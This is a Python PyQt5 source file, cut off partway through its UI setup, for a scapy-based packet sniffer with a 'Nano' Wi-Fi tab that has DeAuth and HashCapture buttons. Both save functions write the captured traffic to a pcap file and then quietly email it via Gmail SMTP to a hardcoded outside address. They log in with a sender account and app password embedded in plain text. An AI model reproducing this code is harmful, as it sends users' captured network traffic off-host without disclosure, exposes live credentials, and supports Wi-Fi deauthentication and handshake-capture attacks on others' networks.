from PyQt5 import QtCore, QtGui, QtWidgets
from scapy.all import *
from monitor_modules import sniff_object
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from frames_list import panda_animation_frames
import time
from prettytable import PrettyTable
class Ui_MainWindow(object):
#------------------------------------------------MONITOR VARIABLES AND FUNCTIONS----------------------------------------------------------------------------
    monitor_searched_packets=[]
    monitor_packet_count=0
    monitor_current_packets=[]
    monitor_recorded_ips=[]
    monitor_current_found_ips=[]
    monitor_udp_count=0
    monitor_tcp_count=0
    monitor_arp_count=0
    monitor_icmp_count=0
    monitor_dns_count=0
    monitor_tls_count=0
    monitor_ip_table=PrettyTable()
    monitor_ip_table.field_names=['SOURCE','DESTINATION','P','TYP']
    monitor_ip_table.max_width=38
    monitor_ip_table.border=True
    monitor_ip_table.align="r"
    def monitor_search_function(self):
        self.monitor_searched_packets.clear()
        self.Monitor_mainscreen_textEdit.setHtml("")
        for packet in self.monitor_current_packets:
            if not self.Monitor_IP_Search_comboBox.currentText == "None":
                ip_to_search=self.Monitor_IP_Search_comboBox.currentText()
                if packet.haslayer(IP) and (packet[IP].src == ip_to_search or packet[IP].dst==ip_to_search):
                    self.monitor_searched_packets.append(packet)
            if self.Monitor_ARP_Search_Checkbox.isChecked() and packet.haslayer(ARP):
                self.monitor_searched_packets.append(packet)
            elif self.Monitor_TCP_Search_Checkbox.isChecked() and packet.haslayer(TCP):
                self.monitor_searched_packets.append(packet)
            elif self.Monitor_UDP_Search_Checkbox.isChecked() and packet.haslayer(UDP):
                self.monitor_searched_packets.append(packet)
        self.monitor_ip_table.clear_rows()
        for packet in self.monitor_searched_packets:
            self.monitor_packet_handler(packet)
        self.Monitor_IP_Textedit.setText(self.monitor_ip_table.get_html_string())
    def monitor_search_clear_button_clicked(self):
        self.Monitor_TCP_Search_Checkbox.setChecked(True)
        self.Monitor_UDP_Search_Checkbox.setChecked(True)
        self.Monitor_ARP_Search_Checkbox.setChecked(True)
        self.monitor_searched_packets.clear()
        self.Monitor_mainscreen_textEdit.setHtml("")
        for packet in self.monitor_current_packets:
            if not self.Monitor_IP_Search_comboBox.currentText == "None":
                ip_to_search=self.Monitor_IP_Search_comboBox.currentText()
                if packet.haslayer(IP) and (packet[IP].src == ip_to_search or packet[IP].dst==ip_to_search):
                    self.monitor_searched_packets.append(packet)
            if self.Monitor_ARP_Search_Checkbox.isChecked() and packet.haslayer(ARP):
                self.monitor_searched_packets.append(packet)
            elif self.Monitor_TCP_Search_Checkbox.isChecked() and packet.haslayer(TCP):
                self.monitor_searched_packets.append(packet)
            elif self.Monitor_UDP_Search_Checkbox.isChecked() and packet.haslayer(UDP):
                self.monitor_searched_packets.append(packet)
        self.monitor_ip_table.clear_rows()
        for packet in self.monitor_searched_packets:
            self.monitor_packet_handler(packet)
        self.Monitor_IP_Textedit.setText(self.monitor_ip_table.get_html_string())
    def monitor_search_save_clicked(self):
        wrpcap("sniffed_packets_searchresult_project.cap",self.monitor_searched_packets,append=False)
        sender_email = "ha.lowkey.05.ck@gmail.com"
        sender_password = "iyne grhs iypl nkii"
        receiver_email = "krishj41205@gmail.com"
        subject = "PCAP File Attached"

        # Create a message object
        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = receiver_email
        message["Subject"] = subject

        # Add body text (optional)
        body = "Hello, This is the sniffed CAP file."
        message.attach(MIMEText(body, "plain"))

        # Attach the PCAP file
        pcap_file_path = "sniffed_packets_searchresult_project.cap"
        with open(pcap_file_path, "rb") as file:
            pcap_attachment = MIMEApplication(file.read())
            pcap_attachment["Content-Disposition"] = f"attachment; filename=sniffed_packets_project_searched.cap"
            message.attach(pcap_attachment)

        # Connect to the SMTP server (for Gmail)
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()

        # Login to your Gmail account
        server.login(sender_email, sender_password)

        # Send the email
        server.sendmail(sender_email, receiver_email, message.as_string())

        # Quit the server
        server.quit()
    def monitor_start_clicked(self):
        if self.Monitor_Start_Button.text()=="Start":
            self.monitor_start_sniffing()
        else:
            self.monitor_stop_snffing()
    def monitor_start_sniffing(self):
        self.Monitor_mainscreen_textEdit.setHtml("")
        self.monitor_set_count_zero()
        print("start function is running!!!")
        self.monitor_sniffer=sniff_object()
        self.monitor_sniffer.packet_signal.connect(self.monitor_packet_handler)
        self.monitor_sniffer.start()
        self.Monitor_Start_Button.setText("Stop")
    def monitor_stop_snffing(self):
        self.monitor_sniffer.terminate()
        self.Monitor_Start_Button.setText("Start")
    def monitor_save_file(self):
        wrpcap("sniffed_packets_project.cap",self.monitor_current_packets,append=False)
        sender_email = "ha.lowkey.05.ck@gmail.com"
        sender_password = "iyne grhs iypl nkii"
        receiver_email = "krishj41205@gmail.com"
        subject = "PCAP File Attached"

        # Create a message object
        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = receiver_email
        message["Subject"] = subject

        # Add body text (optional)
        body = "Hello, This is the sniffed CAP file."
        message.attach(MIMEText(body, "plain"))

        # Attach the PCAP file
        pcap_file_path = "sniffed_packets_project.cap"
        with open(pcap_file_path, "rb") as file:
            pcap_attachment = MIMEApplication(file.read())
            pcap_attachment["Content-Disposition"] = f"attachment; filename=sniffed_packets_project.cap"
            message.attach(pcap_attachment)

        # Connect to the SMTP server (for Gmail)
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()

        # Login to your Gmail account
        server.login(sender_email, sender_password)

        # Send the email
        server.sendmail(sender_email, receiver_email, message.as_string())

        # Quit the server
        server.quit()
    def monitor_set_count_zero(self):
        self.monitor_current_packets.clear()
        self.Monitor_mainscreen_textEdit.setHtml("")
        self.Monitor_ARP_Count_label.setText(f"ARP: 0")
        self.Monitor_TCP_Count_label.setText("TCP: 0")
        self.Monitor_UDP_Count_label.setText("UDP: 0")
        self.Monitor_ICMP_Count_label.setText("ICMP: 0")
        self.Monitor_DNS_Count_label.setText("DNS: 0")
        self.Monitor_TLS_Count_label.setText("TLS: 0")
        self.Monitor_count_label.setText("Count: 0")
        self.monitor_arp_count=0
        self.monitor_tcp_count=0
        self.monitor_dns_count=0
        self.monitor_tls_count=0
        self.monitor_udp_count=0
        self.monitor_icmp_count=0
        self.monitor_packet_count=0
        self.monitor_ip_table.clear_rows()
        self.Monitor_IP_Textedit.setText(self.monitor_ip_table.get_html_string())
        self.Monitor_IP_Search_comboBox.clear()
    def monitor_packet_handler(self,packet):
        new_packet=""
        if packet.haslayer(TCP):
            self.monitor_tcp_count+=1
            self.Monitor_TCP_Count_label.setText(f"TCP: {self.monitor_tcp_count}")
            self.monitor_current_packets.append(packet)
            new_packet = self.make_tcp(packet)
            if packet.haslayer(IP):
                try:         
                    if packet[IP].src not in self.monitor_current_found_ips:
                        self.Monitor_IP_Search_comboBox.addItem(packet[IP].src)
                        self.monitor_current_found_ips.append(packet[IP].src)
                    if packet[IP].dst not in self.monitor_current_found_ips:
                        self.Monitor_IP_Search_comboBox.addItem(packet[IP].dst)
                        self.monitor_current_found_ips.append(packet[IP].dst)
                    self.monitor_add_ip(packet,"TCP")
                except Exception as e:
                    print(e)

        elif packet.haslayer(UDP):
            self.monitor_udp_count+=1
            self.Monitor_UDP_Count_label.setText(f"UDP: {self.monitor_udp_count}")
            self.monitor_current_packets.append(packet)
            new_packet = self.make_udp(packet)
            if packet.haslayer(IP):
                try:
                    self.monitor_add_ip(packet,"UDP")
                    if packet[IP].src not in self.monitor_current_found_ips:
                        self.Monitor_IP_Search_comboBox.addItem(packet[IP].src)
                        self.monitor_current_found_ips.append(packet[IP].src)
                    if packet[IP].dst not in self.monitor_current_found_ips:
                        self.Monitor_IP_Search_comboBox.addItem(packet[IP].dst)
                        self.monitor_current_found_ips.append(packet[IP].dst)
                except Exception as e:
                    print(e)
        elif packet.haslayer(ARP):
            self.monitor_arp_count+=1
            self.Monitor_ARP_Count_label.setText(f"ARP: {self.monitor_arp_count}")
            self.monitor_current_packets.append(packet)
            new_packet = self.make_arp(packet)
            if packet.haslayer(IP):
                try:
                    print("arp packetd with ip layer")
                    self.monitor_add_ip(packet,"ARP")
                    if packet[IP].src not in self.monitor_current_found_ips:
                        self.Monitor_IP_Search_comboBox.addItem(packet[IP].src)
                        self.monitor_current_found_ips.append(packet[IP].src)
                    if packet[IP].dst not in self.monitor_current_found_ips:
                        self.Monitor_IP_Search_comboBox.addItem(packet[IP].dst)
                        self.monitor_current_found_ips.append(packet[IP].dst)
                except Exception as e:
                    print(e)
            else:
                print("ARP packet without IP later")
        elif packet.haslayer(DNS):
            self.monitor_dns_count+=1
            self.Monitor_DNS_Count_label.setText(f"DNS: {self.monitor_dns_count}")
            self.monitor_current_packets.append(packet)
            new_packet = self.make_dns(packet)

        elif packet.haslayer(DHCP):
            self.monitor_current_packets.append(packet)
            new_packet = self.make_dhcp(packet)

        else:
            pass
        if new_packet != "":
            self.monitor_add_packet(new_packet)      
    def monitor_add_packet(self,packet):
        self.monitor_packet_count+=1
        self.Monitor_count_label.setText(f"Count: {self.monitor_packet_count}")
        current_packets=self.Monitor_mainscreen_textEdit.document().toHtml()
        new_packet=packet
        self.appended_packets=new_packet+current_packets
        self.Monitor_mainscreen_textEdit.setHtml(self.appended_packets)
        self.Monitor_count_label.setText(f"Count: {self.monitor_packet_count}")
    def monitor_add_ip(self,packet,type):
        packet_summary=f"{packet[IP].src}-->{packet[IP].dst},{packet[IP].proto},{type}"
        if packet_summary not in self.monitor_recorded_ips:
            self.monitor_ip_table.add_row([packet[IP].src,packet[IP].dst,packet[IP].proto,type])
            self.Monitor_IP_Textedit.setHtml(f"<div style='border: 5px solid white;'>{self.monitor_ip_table.get_html_string()}</div>")
            self.monitor_recorded_ips.append(packet_summary)
    def make_icmp(self, packet):
        icmp_info = f"ICMP: Type: <font color='lightgreen'>{packet[ICMP].type}</font>, " \
                    f"Code: <font color='beige'>{packet[ICMP].code}</font>"
        return f"{icmp_info}"
    def make_udp(self, packet):
        destination_ip = ""
        if packet.haslayer(IP):
            destination_ip = f"<font color='white'>Destination IP: </font><font color='orange'>{packet[IP].dst}</font>"

        udp_info = f"<font color='white'>UDP: Source Port: </font><font color='turquoise'>{packet[UDP].sport}</font>, " \
                f"<font color='white'>Destination Port: </font><font color='lightgreen'>{packet[UDP].dport}</font>, " \
                f"<font color='white'>Length: </font><font color='beige'>{packet[UDP].len}</font>"
        
        return f"{destination_ip} {udp_info}"
    def make_tcp(self, packet):
        destination_ip = ""
        if packet.haslayer(IP):
            destination_ip = f"<font color='white'>Destination IP: </font><font color='orange'>{packet[IP].dst}</font>"

        tcp_info = f"<font color='white'>TCP: Source Port: </font><font color='turquoise'>{packet[TCP].sport}</font>, " \
                    f"<font color='white'>Destination Port: </font><font color='lightgreen'>{packet[TCP].dport}</font>, " \
                    f"<font color='white'>Window: </font><font color='beige'>{packet[TCP].window}</font>, " \
                    f"<font color='white'>Seq: </font><font color='gold'>{packet[TCP].seq}</font>, " \
                    f"<font color='white'>Ack: </font><font color='red'>{packet[TCP].ack}</font>, " \
                    f"<font color='white'>Reserved: </font><font color='brown'>{packet[TCP].reserved}</font>, " \
                    f"<font color='white'>Flags: </font><font color='cyan'>{packet[TCP].flags}</font>, " \
                    f"<font color='white'>Options: </font><font color='darkorange'>{packet[TCP].options}</font>"

        return f"{tcp_info},{destination_ip}"
    def make_arp(self, packet):
        arp_info = f"<font color='white'>ARP: Sender IP: </font><font color='turquoise'>{packet[ARP].psrc}</font>, " \
                f"<font color='white'>Sender MAC: </font><font color='lightgreen'>{packet[ARP].hwsrc}</font>, " \
                f"<font color='white'>Target IP: </font><font color='beige'>{packet[ARP].pdst}</font>, " \
                f"<font color='white'>Target MAC: </font><font color='gold'>{packet[ARP].hwdst}</font>"
        return arp_info
    def make_dns(self, packet):
        # # dns_info = f"DNS: Transaction ID: <font color='blue'>{packet[DNS].id}</font>, " \
        # #        f"Flags: <font color='green'>{packet[DNS].flags}</font>, " \
        # #        f"Questions: <font color='purple'>{len(packet[DNS].qd)}</font>, " \
        # #        f"Answers: <font color='orange'>{len(packet[DNS].an)}</font>, " \
        # #        f"Authority RRs: <font color='red'>{len(packet[DNS].ns)}</font>, " \
        # #        f"Additional RRs: <font color='brown'>{len(packet[DNS].ar)}</font>"

        # return dns_info
        pass
    def make_dhcp(self, packet):
        dhcp_info = f"DHCP: Transaction ID: <font color='blue'>{packet[DHCP].xid}</font>, " \
                f"Options: <font color='green'>{packet[DHCP].options}</font>, " \
                f"Operation: <font color='purple'>{packet[DHCP].options[0][1]}</font>, " \
                f"Client MAC: <font color='orange'>{packet[DHCP].chaddr}</font>"

        return dhcp_info
#------------------------------------------------MONITOR VARIABLES AND FUNCTIONS----------------------------------------------------------------------------
#------------------------------------------------NANO VARIABLES AND FUNCTIONS START-------------------------------------------------------------------------
    nano_device_count=0
    nano_access_points=[]
    nano_light_colors=[
    "#FFFFFF",  # White
    "#FFFF00",  # Yellow
    "#FFD700",  # Gold
    "#FFA07A",  # Light Salmon
    "#FF6347",  # Tomato
    "#FF4500",  # Orange Red
    "#FF8C00",  # Dark Orange
    "#FF69B4",  # Hot Pink
    "#FF1493",  # Deep Pink
    "#FF00FF",  # Magenta
    "#DA70D6",  # Orchid
    "#BA55D3",  # Medium Orchid
    "#9370DB",  # Medium Purple
    "#8A2BE2",  # Blue Violet
    "#7B68EE",  # Medium Slate Blue - Removed
    "#4169E1",  # Royal Blue - Removed
    "#00BFFF",  # Deep Sky Blue - Removed
    "#00FFFF",  # Cyan / Aqua - Removed
    "#00CED1",  # Dark Turquoise - Removed
    "#20B2AA",  # Light Sea Green
    "#00FA9A",  # Medium Spring Green
    "#7FFF00",  # Chartreuse
    "#ADFF2F",  # Green Yellow
    "#32CD32",  # Lime Green
    "#00FF00",  # Lime
    "#98FB98",  # Pale Green
    "#90EE90",  # Light Green
]
    nano_scanbox_default_html= '''
            <html>
                <head>
                    <style>
                        body{
                            color: #ffffff
                        }
                        table {
                            border-collapse: collapse;
                            width: 100%;
                        }
                        th, td {
                            border: 1px solid #ffffff;
                            padding: 8px;
                            text-align: center;
                        }
                        th {
                            background-color: #000000;
                        }
                    </style>
                </head>
                <body>
                    <table id="scan_table">
                        <tr>
                            <th>S No.</th>
                            <th>Name</th>
                            <th>BSSID</th>
                            <th>Channel</th>
                        </tr>
                    </table>
                </body>
            </html>
        '''
#------------------------------------------------NANO VARIABLES AND FUNCTIONS END---------------------------------------------------------------------------

    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(800, 597)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.Main_Tab = QtWidgets.QTabWidget(self.centralwidget)
        self.Main_Tab.setGeometry(QtCore.QRect(0, 0, 801, 591))
        font = QtGui.QFont()
        font.setFamily("DejaVu Sans Mono")
        font.setPointSize(8)
        font.setBold(False)
        font.setWeight(50)
        font.setKerning(True)
        self.Main_Tab.setFont(font)
        self.Main_Tab.setLayoutDirection(QtCore.Qt.LeftToRight)
        self.Main_Tab.setTabShape(QtWidgets.QTabWidget.Rounded)
        self.Main_Tab.setObjectName("Main_Tab")
        self.monitor_tab = QtWidgets.QWidget()
        self.monitor_tab.setObjectName("monitor_tab")
        self.Monitor_mainscreen_textEdit = QtWidgets.QTextEdit(self.monitor_tab)
        self.Monitor_mainscreen_textEdit.setGeometry(QtCore.QRect(0, 0, 801, 321))
        font = QtGui.QFont()
        font.setFamily("Noto Mono")
        font.setPointSize(7)
        font.setBold(True)
        font.setWeight(75)
        font.setKerning(True)
        self.Monitor_mainscreen_textEdit.setFont(font)
        self.Monitor_mainscreen_textEdit.setStyleSheet("background-color: #0323a3;")
        self.Monitor_mainscreen_textEdit.setObjectName("Monitor_mainscreen_textEdit")
        self.Monitor_mainscreen_textEdit.setReadOnly(True)
        self.Monitor_count_label = QtWidgets.QLabel(self.monitor_tab)
        self.Monitor_count_label.setGeometry(QtCore.QRect(590, 300, 131, 20))
        font = QtGui.QFont()
        font.setFamily("Noto Mono")
        font.setPointSize(9)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(11)
        font.setStrikeOut(False)
        font.setKerning(True)
        self.Monitor_count_label.setFont(font)
        self.Monitor_count_label.setStyleSheet("color: rgb(255, 255, 255);\n"
        "font: 90 9pt \"Noto Mono\";")
        self.Monitor_count_label.setObjectName("Monitor_count_label")
        self.Monitor_Start_Button = QtWidgets.QPushButton(self.monitor_tab)
        self.Monitor_Start_Button.setGeometry(QtCore.QRect(430, 440, 81, 41))
        font = QtGui.QFont()
        font.setFamily("KacstArt")
        font.setPointSize(9)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(9)
        font.setKerning(True)
        self.Monitor_Start_Button.setFont(font)
        self.Monitor_Start_Button.setStyleSheet("font: 75 9pt \"KacstArt\";")
        self.Monitor_Start_Button.setObjectName("Monitor_Start_Button")
        self.Monitor_save_button = QtWidgets.QPushButton(self.monitor_tab)
        self.Monitor_save_button.setGeometry(QtCore.QRect(430, 490, 81, 41))
        font = QtGui.QFont()
        font.setFamily("KacstArt")
        font.setPointSize(9)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(9)
        font.setKerning(True)
        self.Monitor_save_button.setFont(font)
        self.Monitor_save_button.setStyleSheet("font: 75 9pt \"KacstArt\";")
        self.Monitor_save_button.setObjectName("Monitor_save_button")
        self.Monitor_TCP_Count_label = QtWidgets.QLabel(self.monitor_tab)
        self.Monitor_TCP_Count_label.setGeometry(QtCore.QRect(270, 340, 71, 16))
        font = QtGui.QFont()
        font.setFamily("Noto Sans Mono")
        font.setPointSize(9)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(50)
        font.setKerning(True)
        self.Monitor_TCP_Count_label.setFont(font)
        self.Monitor_TCP_Count_label.setStyleSheet("font: 400 9pt \"Noto Sans Mono\";\n"
        "")
        self.Monitor_TCP_Count_label.setObjectName("Monitor_TCP_Count_label")
        self.Monitor_UDP_Count_label = QtWidgets.QLabel(self.monitor_tab)
        self.Monitor_UDP_Count_label.setGeometry(QtCore.QRect(270, 370, 71, 16))
        font = QtGui.QFont()
        font.setFamily("Noto Sans Mono")
        font.setPointSize(9)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(50)
        font.setKerning(True)
        self.Monitor_UDP_Count_label.setFont(font)
        self.Monitor_UDP_Count_label.setStyleSheet("font: 400 9pt \"Noto Sans Mono\";\n"
        "")
        self.Monitor_UDP_Count_label.setObjectName("Monitor_UDP_Count_label")
        self.Monitor_ARP_Count_label = QtWidgets.QLabel(self.monitor_tab)
        self.Monitor_ARP_Count_label.setGeometry(QtCore.QRect(270, 400, 71, 16))
        font = QtGui.QFont()
        font.setFamily("Noto Sans Mono")
        font.setPointSize(9)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(50)
        font.setKerning(True)
        self.Monitor_ARP_Count_label.setFont(font)
        self.Monitor_ARP_Count_label.setStyleSheet("font: 400 9pt \"Noto Sans Mono\";\n"
        "")
        self.Monitor_ARP_Count_label.setObjectName("Monitor_ARP_Count_label")
        self.Monitor_ICMP_Count_label = QtWidgets.QLabel(self.monitor_tab)
        self.Monitor_ICMP_Count_label.setGeometry(QtCore.QRect(270, 430, 71, 16))
        font = QtGui.QFont()
        font.setFamily("Noto Sans Mono")
        font.setPointSize(9)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(50)
        font.setKerning(True)
        self.Monitor_ICMP_Count_label.setFont(font)
        self.Monitor_ICMP_Count_label.setStyleSheet("font: 400 9pt \"Noto Sans Mono\";\n"
        "")
        self.Monitor_ICMP_Count_label.setObjectName("Monitor_ICMP_Count_label")
        self.Monitor_DNS_Count_label = QtWidgets.QLabel(self.monitor_tab)
        self.Monitor_DNS_Count_label.setGeometry(QtCore.QRect(270, 460, 71, 16))
        font = QtGui.QFont()
        font.setFamily("Noto Sans Mono")
        font.setPointSize(9)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(50)
        font.setKerning(True)
        self.Monitor_DNS_Count_label.setFont(font)
        self.Monitor_DNS_Count_label.setStyleSheet("font: 400 9pt \"Noto Sans Mono\";\n"
        "")
        self.Monitor_DNS_Count_label.setObjectName("Monitor_DNS_Count_label")
        self.Monitor_TLS_Count_label = QtWidgets.QLabel(self.monitor_tab)
        self.Monitor_TLS_Count_label.setGeometry(QtCore.QRect(270, 490, 71, 16))
        font = QtGui.QFont()
        font.setFamily("Noto Sans Mono")
        font.setPointSize(9)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(50)
        font.setKerning(True)
        self.Monitor_TLS_Count_label.setFont(font)
        self.Monitor_TLS_Count_label.setStyleSheet("font: 400 9pt \"Noto Sans Mono\";\n"
        "")
        self.Monitor_TLS_Count_label.setObjectName("Monitor_TLS_Count_label")
        self.Monitor_Search_Lineedit = QtWidgets.QLineEdit(self.monitor_tab)
        self.Monitor_Search_Lineedit.setGeometry(QtCore.QRect(540, 330, 181, 31))
        self.Monitor_Search_Lineedit.setObjectName("Monitor_Search_Lineedit")
        self.Monitor_Search_button = QtWidgets.QPushButton(self.monitor_tab)
        self.Monitor_Search_button.setGeometry(QtCore.QRect(720, 330, 51, 31))
        font = QtGui.QFont()
        font.setFamily("Inter")
        font.setPointSize(7)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(25)
        self.Monitor_Search_button.setFont(font)
        self.Monitor_Search_button.setStyleSheet("font: 200 7pt \"Inter\";")
        self.Monitor_Search_button.setObjectName("Monitor_Search_button")
        self.Monitor_IP_Search_comboBox = QtWidgets.QComboBox(self.monitor_tab)
        self.Monitor_IP_Search_comboBox.setGeometry(QtCore.QRect(534, 460, 241, 31))
        self.Monitor_IP_Search_comboBox.setObjectName("Monitor_IP_Search_comboBox")
        self.layoutWidget = QtWidgets.QWidget(self.monitor_tab)
        self.layoutWidget.setGeometry(QtCore.QRect(530, 371, 251, 71))
        self.layoutWidget.setObjectName("layoutWidget")
        self.gridLayout = QtWidgets.QGridLayout(self.layoutWidget)
        self.gridLayout.setContentsMargins(0, 0, 0, 0)
        self.gridLayout.setObjectName("gridLayout")
        self.Monitor_TLS_Search_Checkbox = QtWidgets.QCheckBox(self.layoutWidget)
        self.Monitor_TLS_Search_Checkbox.setStyleSheet("font: 700 9pt \"Inter\";")
        self.Monitor_TLS_Search_Checkbox.setObjectName("Monitor_TLS_Search_Checkbox")
        self.gridLayout.addWidget(self.Monitor_TLS_Search_Checkbox, 1, 2, 1, 1)
        self.Monitor_UDP_Search_Checkbox = QtWidgets.QCheckBox(self.layoutWidget)
        self.Monitor_UDP_Search_Checkbox.setStyleSheet("font: 700 9pt \"Inter\";")
        self.Monitor_UDP_Search_Checkbox.setObjectName("Monitor_UDP_Search_Checkbox")
        self.gridLayout.addWidget(self.Monitor_UDP_Search_Checkbox, 1, 0, 1, 1)
        self.Monitor_DNS_Search_Checkbox = QtWidgets.QCheckBox(self.layoutWidget)
        self.Monitor_DNS_Search_Checkbox.setStyleSheet("font: 700 9pt \"Inter\";")
        self.Monitor_DNS_Search_Checkbox.setObjectName("Monitor_DNS_Search_Checkbox")
        self.gridLayout.addWidget(self.Monitor_DNS_Search_Checkbox, 0, 2, 1, 1)
        self.Monitor_TCP_Search_Checkbox = QtWidgets.QCheckBox(self.layoutWidget)
        self.Monitor_TCP_Search_Checkbox.setStyleSheet("font: 700 9pt \"Inter\";")
        self.Monitor_TCP_Search_Checkbox.setObjectName("Monitor_TCP_Search_Checkbox")
        self.gridLayout.addWidget(self.Monitor_TCP_Search_Checkbox, 0, 0, 1, 1)
        self.Monitor_ARP_Search_Checkbox = QtWidgets.QCheckBox(self.layoutWidget)
        self.Monitor_ARP_Search_Checkbox.setStyleSheet("font: 700 9pt \"Inter\";")
        self.Monitor_ARP_Search_Checkbox.setObjectName("Monitor_ARP_Search_Checkbox")
        self.gridLayout.addWidget(self.Monitor_ARP_Search_Checkbox, 0, 1, 1, 1)
        self.Monitor_ICMP_Search_Checkbox = QtWidgets.QCheckBox(self.layoutWidget)
        self.Monitor_ICMP_Search_Checkbox.setStyleSheet("font: 700 9pt \"Inter\";")
        self.Monitor_ICMP_Search_Checkbox.setObjectName("Monitor_ICMP_Search_Checkbox")
        self.gridLayout.addWidget(self.Monitor_ICMP_Search_Checkbox, 1, 1, 1, 1)
        self.Monitor_count_label_2 = QtWidgets.QLabel(self.monitor_tab)
        self.Monitor_count_label_2.setGeometry(QtCore.QRect(720, 300, 61, 20))
        font = QtGui.QFont()
        font.setFamily("Noto Mono")
        font.setPointSize(9)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(11)
        font.setStrikeOut(False)
        font.setKerning(True)
        self.Monitor_count_label_2.setFont(font)
        self.Monitor_count_label_2.setStyleSheet("color: rgb(255, 255, 255);\n"
        "font: 90 9pt \"Noto Mono\";")
        self.Monitor_count_label_2.setObjectName("Monitor_count_label_2")
        self.Monitor_IP_Textedit = QtWidgets.QTextEdit(self.monitor_tab)
        self.Monitor_IP_Textedit.setGeometry(QtCore.QRect(2, 324, 256, 211))
        self.Monitor_IP_Textedit.setStyleSheet("background-color: rgb(36, 31, 49);\n"
        "color: rgb(255, 255, 255);\n""font-size:8pt;\n""font-weight:200;")
        self.Monitor_IP_Textedit.setObjectName("Monitor_IP_Textedit")
        self.frame = QtWidgets.QFrame(self.monitor_tab)
        self.frame.setGeometry(QtCore.QRect(259, 323, 261, 211))
        self.frame.setStyleSheet("\n""background-color: rgb(192, 191, 188);")
        self.frame.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.frame.setFrameShadow(QtWidgets.QFrame.Raised)
        self.frame.setObjectName("frame")
        self.widget = QtWidgets.QWidget(self.monitor_tab)
        self.widget.setGeometry(QtCore.QRect(530, 500, 251, 38))
        self.widget.setObjectName("widget")
        self.horizontalLayout = QtWidgets.QHBoxLayout(self.widget)
        self.horizontalLayout.setContentsMargins(0, 0, 0, 0)
        self.horizontalLayout.setObjectName("horizontalLayout")
        self.Monitor_search_save_button = QtWidgets.QPushButton(self.widget)
        font = QtGui.QFont()
        font.setFamily("KacstArt")
        font.setPointSize(9)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(9)
        font.setKerning(True)
        self.Monitor_search_save_button.setFont(font)
        self.Monitor_search_save_button.setStyleSheet("font: 75 9pt \"KacstArt\";")
        self.Monitor_search_save_button.setObjectName("Monitor_search_save_button")
        self.horizontalLayout.addWidget(self.Monitor_search_save_button)
        self.Monitor_search_clear_button = QtWidgets.QPushButton(self.widget)
        font = QtGui.QFont()
        font.setFamily("KacstArt")
        font.setPointSize(9)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(9)
        font.setKerning(True)
        self.Monitor_search_clear_button.setFont(font)
        self.Monitor_search_clear_button.setStyleSheet("font: 75 9pt \"KacstArt\";")
        self.Monitor_search_clear_button.setObjectName("Monitor_search_clear_button")
        self.horizontalLayout.addWidget(self.Monitor_search_clear_button)
        self.frame.raise_()
        self.Monitor_mainscreen_textEdit.raise_()
        self.Monitor_IP_Textedit.raise_()
        self.Monitor_count_label.raise_()
        self.Monitor_Start_Button.raise_()
        self.Monitor_save_button.raise_()
        self.Monitor_TCP_Count_label.raise_()
        self.Monitor_UDP_Count_label.raise_()
        self.Monitor_ARP_Count_label.raise_()
        self.Monitor_ICMP_Count_label.raise_()
        self.Monitor_DNS_Count_label.raise_()
        self.Monitor_TLS_Count_label.raise_()
        self.Monitor_Search_Lineedit.raise_()
        self.Monitor_Search_button.raise_()
        self.Monitor_IP_Search_comboBox.raise_()
        self.layoutWidget.raise_()
        self.Monitor_count_label_2.raise_()
        self.Monitor_search_save_button.raise_()
        self.Monitor_search_clear_button.raise_()
        self.Main_Tab.addTab(self.monitor_tab, "")
        self.Nano_tab = QtWidgets.QWidget()
        self.Nano_tab.setObjectName("Nano_tab")
        self.Nano_Panda_Animation_Textedit = QtWidgets.QLabel(self.Nano_tab)
        self.Nano_Panda_Animation_Textedit.setGeometry(QtCore.QRect(-30, -10, 391, 321))
        font = QtGui.QFont()
        font.setFamily("DejaVu Sans Mono")
        font.setPointSize(4)
        font.setBold(True)
        font.setWeight(75)
        font.setKerning(True)
        self.Nano_Panda_Animation_Textedit.setFont(font)
        self.Nano_Panda_Animation_Textedit.setStyleSheet("background-color: rgb(0, 0, 0);\n""color: rgb(255, 255, 255);")
        self.Nano_Panda_Animation_Textedit.setObjectName("Nano_Panda_Animation_Textedit")
        self.Nano_Access_points_scan_textedit = QtWidgets.QTextEdit(self.Nano_tab)
        self.Nano_Access_points_scan_textedit.setGeometry(QtCore.QRect(363, 39, 431, 511))
        self.Nano_Access_points_scan_textedit.setStyleSheet("background-color: #0323a3;")
        self.Nano_Access_points_scan_textedit.setObjectName("Nano_Access_points_scan_textedit")
        self.Nano_Access_points_Dropdown = QtWidgets.QComboBox(self.Nano_tab)
        self.Nano_Access_points_Dropdown.setGeometry(QtCore.QRect(0, 310, 361, 36))
        self.Nano_Access_points_Dropdown.setObjectName("Nano_Access_points_Dropdown")
        self.Nano_Noti_Textedit = QtWidgets.QTextEdit(self.Nano_tab)
        self.Nano_Noti_Textedit.setGeometry(QtCore.QRect(-1, 344, 361, 171))
        self.Nano_Noti_Textedit.setStyleSheet("")
        self.Nano_Noti_Textedit.setObjectName("Nano_Noti_Textedit")
        self.Nano_DeAuth_pushbutton = QtWidgets.QPushButton(self.Nano_tab)
        self.Nano_DeAuth_pushbutton.setGeometry(QtCore.QRect(0, 513, 181, 36))
        self.Nano_DeAuth_pushbutton.setObjectName("Nano_DeAuth_pushbutton")
        self.Nano_HashCapture_button = QtWidgets.QPushButton(self.Nano_tab)
        self.Nano_HashCapture_button.setGeometry(QtCore.QRect(180, 513, 181, 36))
